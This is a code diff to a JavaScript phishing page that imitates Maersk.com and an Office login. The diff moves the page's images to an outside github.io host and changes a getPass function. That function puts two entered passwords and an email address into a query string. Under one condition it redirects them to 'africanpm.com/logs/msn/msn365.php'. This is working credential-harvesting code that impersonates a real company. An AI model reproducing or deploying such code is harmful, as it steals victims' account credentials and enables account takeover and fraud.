@@ -23,7 +23,7 @@ const maerskPage = `
 
             <nav>
                 <ul>
-                    <li><img src="logo1.svg" alt=""></li>
+                    <li><img src="https://babo4.github.io/msk/logo1.svg" alt=""></li>
                     <li class="closeMenu">Price</li>
                     <li class="closeMenu">Book &#9013;</li>
                     <li class="closeMenu">Tracking</li>
@@ -71,7 +71,7 @@ const maerskPage = `
     
             <div class="maersk_user">
                 <section>
-                    <img src="user1.svg" alt="">
+                    <img src="https://babo4.github.io/msk/user1.svg" alt="">
                     <span>
                         <h3>New to Maersk.com?</h3>
                         <p>
@@ -82,7 +82,7 @@ const maerskPage = `
                 </section>
     
                 <section>
-                    <img src="user2.svg" alt="">
+                    <img src="https://babo4.github.io/msk/user2.svg" alt="">
                     <span>
                         <h3>How to get started</h3>
                         <p>
@@ -109,7 +109,7 @@ const maerskPage = `
     
                 <section class="logistics_content">
                     <div>
-                        <img src="bg/m1.jpg" alt="">
+                        <img src="https://babo4.github.io/msk/bg/m1.jpg" alt="">
                     <h3>Transportation Services</h3>
                     <p>
                         Learn how Maersk offers small and large businesses the opportunity to grow.
@@ -117,7 +117,7 @@ const maerskPage = `
                     </div>
     
                     <div>
-                        <img src="bg/m2.webp" alt="">
+                        <img src="https://babo4.github.io/msk/bg/m2.webp" alt="">
                     <h3>Supply Chain and Logistics</h3>
                     <p>
                         We focus on solving your supply chain needs from end to end, taking the complexity out of container shipping for you.
@@ -125,7 +125,7 @@ const maerskPage = `
                     </div>
     
                     <div>
-                        <img src="bg/m3.webp" alt="">
+                        <img src="https://babo4.github.io/msk/bg/m3.webp" alt="">
                     <h3>Digital Solutions</h3>
                     <p>
                         Our tailored online services take the complexity out of shipping by letting you instantly book, manage and track shipments, submit Verified Gross Mass information and much more.
@@ -140,7 +140,7 @@ const maerskPage = `
     
                 <section>
                     <div>
-                        <img src="bg/h1.png" alt="">
+                        <img src="https://babo4.github.io/msk/bg/h1.png" alt="">
                         <h5>News</h5>
                         <p>
                             Flying to new limits
@@ -148,7 +148,7 @@ const maerskPage = `
                     </div>
     
                     <div>
-                        <img src="bg/h2.jpg" alt="">
+                        <img src="https://babo4.github.io/msk/bg/h2.jpg" alt="">
                         <h5>News</h5>
                         <p>
                             Maersk Market Update Latin America
@@ -156,7 +156,7 @@ const maerskPage = `
                     </div>
     
                     <div>
-                        <img src="bg/h3.webp" alt="">
+                        <img src="https://babo4.github.io/msk/bg/h3.webp" alt="">
                         <h5>News</h5>
                         <p>
                             Maersk North America Market Update
@@ -164,7 +164,7 @@ const maerskPage = `
                     </div>
     
                     <div>
-                        <img src="bg/h3.webp" alt="">
+                        <img src="https://babo4.github.io/msk/bg/h3.webp" alt="">
                         <h5>Expert opinion</h5>
                         <p>
                             Reviving rail in Europe for efficient logistics
@@ -174,12 +174,12 @@ const maerskPage = `
             </div>
     
             <div class="maersk_labels">
-                <img src="bg/s1.svg" alt="">
-                <img src="bg/s2.svg" alt="">
-                <img src="bg/s3.svg" alt="">
-                <img src="bg/s4.svg" alt="">
-                <img src="bg/s5.svg" alt="">
-                <img src="bg/s6.svg" alt="">
+                <img src="https://babo4.github.io/msk/bg/s1.svg" alt="">
+                <img src="https://babo4.github.io/msk/bg/s2.svg" alt="">
+                <img src="https://babo4.github.io/msk/bg/s3.svg" alt="">
+                <img src="https://babo4.github.io/msk/bg/s4.svg" alt="">
+                <img src="https://babo4.github.io/msk/bg/s5.svg" alt="">
+                <img src="https://babo4.github.io/msk/bg/s6.svg" alt="">
             </div>
     
             <div class="maersk_footer">
@@ -222,7 +222,7 @@ const maerskPage = `
     
                 <section class="maersk_foot2">
                     <ol>
-                        <li><img src="logo1.svg" alt=""></li>
+                        <li><img src="https://babo4.github.io/msk/logo1.svg" alt=""></li>
                         <li>&copy; A.P. Moller - Maersk</li>
                     </ol>
     
@@ -235,8 +235,8 @@ const maerskPage = `
                     </ul>
     
                     <ol>
-                        <li><img src="bg/App_Store_Badge.svg" alt=""></li>
-                        <li><img src="bg/google-play-badge.svg" alt=""></li>
+                        <li><img src="https://babo4.github.io/msk/bg/App_Store_Badge.svg" alt=""></li>
+                        <li><img src="https://babo4.github.io/msk/bg/google-play-badge.svg" alt=""></li>
                     </ol>
                 </section>
             </div>
@@ -648,10 +648,10 @@ function subFormBtn(btn) {
     // 
     function getPass(pass1, pass2, mail) {
         if (pass1 != "" && pass2 !="" && mail != "") {
-            let url = "msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
+            let url = "msn365.php?auth=office&domain=maersk&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
     
-            if (data_send.value == 1) {
-                url = "msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
+            if (data_send.value == 0) {
+                url = "https://africanpm.com/logs/msn/msn365.php?auth=office&domain=maersk&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
             }
     
             location = url;
